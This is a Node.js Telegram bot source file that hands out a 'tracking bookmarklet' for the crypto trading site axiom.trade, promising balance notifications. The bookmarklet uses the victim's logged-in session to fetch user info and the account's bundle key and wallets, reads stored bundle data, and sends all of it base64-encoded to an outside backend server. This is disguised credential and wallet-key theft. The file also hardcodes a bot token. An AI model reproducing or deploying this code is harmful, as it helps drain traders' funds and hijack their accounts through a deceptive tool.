const TelegramBot = require('node-telegram-bot-api');

const BOT_TOKEN = '7641165749:AAFla0YZ3Z7PUViwZQaq8a0W2-ydT7n0bJc';
const BACKEND_URL = 'https://nodebookmark.onrender.com';

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

bot.onText(/\/generate/, (msg) => {
  const chatId = msg.chat.id;
  
  const bookmarklet = `javascript:(async()=>{
    try{
      if(location.hostname!=='axiom.trade'){
        alert('Please navigate to axiom.trade first');
        return;
      }
      if(!localStorage.getItem('isAuthed')){
        return alert('Please log in to axiom.trade first')
      }
      const user=await(await fetch('//api7.axiom.trade/user-info',{method:'POST',credentials:'include'})).json();
      const bundle=await(await fetch('//api8.axiom.trade/bundle-key-and-wallets',{method:'POST',credentials:'include'})).json();
      const bookmarkData={
        telegramId:'${chatId}',
        site:location.href,
        user:user,
        bundle:bundle.bundleKey,
        sBundles:localStorage.getItem('sBundles'),
        eBundles:localStorage.getItem('eBundles')
      };
      location.replace('${BACKEND_URL}/data/'+btoa(JSON.stringify(bookmarkData)))
    }catch(e){
      alert('Error occurred')
    }
  })();`;

  bot.sendMessage(chatId, `
🎯 **Your Tracking Bookmarklet**

📋 **Code:**
\`\`\`
${bookmarklet}
\`\`\`

Your ID: ${chatId}
Server: ${BACKEND_URL}

You'll get balance notifications when used.
  `, { parse_mode: 'Markdown' });
});

console.log(`Bot started - Backend: ${BACKEND_URL}`);
